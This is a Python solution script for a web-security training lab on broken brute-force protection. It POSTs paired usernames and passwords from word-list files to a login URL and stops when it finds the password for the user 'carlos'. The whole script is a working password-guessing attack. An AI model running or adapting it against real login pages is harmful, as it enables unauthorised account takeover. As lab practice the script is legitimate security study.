# Created by sm6r,2024
# Lab: Broken brute-force protection, IP block

import requests
import sys

if len(sys.argv)!=2:
    print("Usage solution.py LOGIN_URL")
    exit()

url = sys.argv[1]
usernames= open("usernames.txt","r").readlines()
passwords= open("passwords.txt","r").readlines()
flag = True


for i in range(len(usernames)):
    response = requests.post(url,{'username':usernames[i].strip(),'password':passwords[i].strip()})

    if response.text.find("Gateway Timeout") != -1:
        print("The URL isnt valid...")
        exit()

    if usernames[i].strip()=="carlos":
        print("Username: carlos    Password: ",end="",flush=True)
        print(f"{passwords[i].strip()}",end=" "*len(passwords[i].strip())+"\r",flush=True)


    if response.text.find("Your username is: carlos") != -1:
        print(f"{passwords[i]}\nFound valid credentials\nATTACK FINISHED SUCCESSFULLY")
        flag=False
        break


if flag:
    print("COULDNT FIND CORRECT CREDENTIALS")


